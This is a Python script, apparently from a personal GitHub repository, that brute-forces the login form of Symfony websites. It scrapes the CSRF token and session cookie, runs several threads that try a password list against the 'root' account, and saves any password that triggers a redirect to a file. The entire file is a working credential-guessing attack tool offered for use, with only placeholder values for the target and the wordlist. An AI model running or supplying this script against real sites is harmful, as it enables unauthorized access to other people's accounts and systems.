#!/usr/bin/python3

# author Diego Rodríguez Riera
# from https://github.com/riera90/scripts
# licenced under BSD 3-Clause License
# date 10/01/19

# Intended to use in symfony websites, tested in version 4


import requests
import re
import json
import threading
import time
import os


################################################################################
############################### Configuration ##################################
################################################################################
number_of_threads = 4
# target login
target_login = "http://www.site.com/login"
# target username and password input
login_html = "login"
password_html = "password"
# user to try passwords on
login = "root"
# list of passwords, be imaginative
passwords = ["this","is","a","list","of","passwords"]
################################################################################
########################### end of Configuration ###############################
################################################################################

# lock for the threads
lock = threading.Lock()
# index of passwords for the threads
password_iterator = 0
# event, all threads are initialized
initialized = threading.Event()
initialized.clear()


# this function tests a series of passwords
def test_passwords_thread():
	# make the password_iterator global here
	global password_iterator
	# creates a local thread data
	thread_data = threading.local()
	# creates the session (mainly to store cookies1)
	thread_data.bot = requests.session()
	thread_data.thread_name = threading.currentThread().getName()
	# makes the GET
	thread_data.response = thread_data.bot.get(url = target_login)
	print(thread_data.thread_name,"-> login GET:")
	print("\tstatus_code      -->", thread_data.response.status_code)
	print("\tresponse.history -->", thread_data.response.history)
	print("\tredirected to    -->", thread_data.response.url)
	
	
	# obtains the csrf and phpsessid tokens
	thread_data.content = thread_data.response.content.decode("utf-8")
	thread_data.match = re.search(r'''_csrf_token"\n *value="(.*)"''', thread_data.content, re.I)
	thread_data._csrf_token = thread_data.match.group(1)
	
	thread_data.match = re.search(r'''PHPSESSID=(.*); path=/; HttpOnly''', thread_data.response.headers['Set-Cookie'], re.I)
	thread_data.PHPSESSID = thread_data.match.group(1)
	
	# prints the obtained tokens
	print("\t_csrf_token      -->", thread_data._csrf_token)
	print("\tPHPSESSID        -->", thread_data.PHPSESSID)
	
	initialized.wait(timeout=10)
	# here we go
	while password_iterator < len(passwords):
		lock.acquire()
		try:
			thread_data.password = passwords[password_iterator]
			password_iterator += 1
		except:
			return
		lock.release()
		print(thread_data.thread_name,"-> trying",login,";",thread_data.password)
		# sets the form data
		thread_data.form = {login_html:login,
							password_html:thread_data.password,
							'_csrf_token':thread_data._csrf_token}
		# makes the post
		thread_data.response = thread_data.bot.post(url = target_login, data = thread_data.form)
	
		# decoment this if you want to know more info
		# print("\tstatus_code      -->", response.status_code)
		# print("\tresponse.history -->", response.history)
		# print("\tredirected to    -->",response.url)
	
		# if the seession is redirected, we got the good password
		if thread_data.response.url != target_login:
			print("\n")
			print(thread_data.thread_name,"-> correct password is:", thread_data.password)
			print(thread_data.thread_name,"-> saving password into correct_password.txt")
			file = open('correct_password.txt', 'a')
			file.write(str(thread_data.thread_name))
			file.write(' -> ')
			file.write(login)
			file.write(';')
			file.write(thread_data.password)
			file.write('\n')
			file.close()
			os._exit(0)



# creates the threads
print("initializing threads.")
threads = []
for i in range(number_of_threads):
	t = threading.Thread(target=test_passwords_thread, name='thread '+str(i))
	threads.append(t)
# launches the threads
for thread in threads:
	thread.start()
	
time.sleep(3)
initialized.set()
	
	
# joins the threads
for thread in threads:
	thread.join()